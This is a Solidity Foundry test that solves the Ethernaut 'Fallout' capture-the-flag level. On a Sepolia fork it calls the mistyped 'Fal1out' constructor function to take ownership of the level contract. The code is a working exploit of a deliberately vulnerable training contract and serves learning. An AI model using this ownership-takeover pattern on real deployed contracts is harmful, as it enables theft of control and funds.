// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "../src/Ethernaut Challenge/02_Fallout.sol";

contract ContractTest02 is DSTest {
 
    Fallout level2 = Fallout(payable(0xa32dcd457697CecB9c83aD60C63Fd49F3A3e71c9));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testExploit222() public {
        level2.owner();
        level2.Fal1out();
        level2.owner();
    }

    receive() external payable {}
}
